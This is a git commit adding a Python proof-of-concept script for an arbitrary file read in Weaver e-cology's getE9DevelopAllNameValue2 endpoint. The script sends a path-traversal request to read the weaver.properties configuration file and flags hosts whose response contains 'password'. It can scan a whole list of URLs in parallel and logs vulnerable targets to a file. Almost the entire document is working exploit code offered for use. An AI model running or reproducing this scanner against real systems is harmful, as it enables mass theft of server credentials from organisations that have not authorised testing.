e29ed6a760a595ef147033e6e581286f4b80336c
lbyssssss <594479093@qq.com>
2024-03-18 22:43:21 +0800

    poc

---
+++ 泛微e-cology getE9DevelopAllNameValue2接口存在任意文件读取/poc.py
@@ -0,0 +1,63 @@
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="泛微e-cology getE9DevelopAllNameValue2接口存在任意文件读取")
+    parser.add_argument('-u','--url',help="please input your url")
+    parser.add_argument('-f','--file',help="please input your file")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        with open(args.file,'r',encoding='utf-8') as fp:
+            fo = fp.readlines()
+            url_list = []
+            for i in fo:
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool()
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+
+def banner():
+    banner = '''
+     __                            __                      __  __ 
+    |  \                          |  \                    |  \|  \
+    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
+    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
+    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
+    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
+    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
+    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
+     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
+                                                auther:lllo    
+    '''
+    print(banner)
+def poc(target):
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Accept-Encoding': 'gzip, deflate',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121',
+    }
+    proxies = {
+        'http':'127.0.0.1:8080',
+        'https':'127.0.0.1:8080'
+    }
+    url = target+'/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties'
+
+    try:
+        res = requests.get(url=url,headers=headers,timeout=5,proxies=proxies).text
+        if "password" in res:
+            with open('res2.txt','a') as fp1:
+                fp1.write(f"[+]{target} is veriable"+'\n')
+        else:
+            print(f'[-]{target} is not veriable')
+    except:
+        print(f'[*]{target} server erro')
+
+if __name__ =='__main__':
+    main()
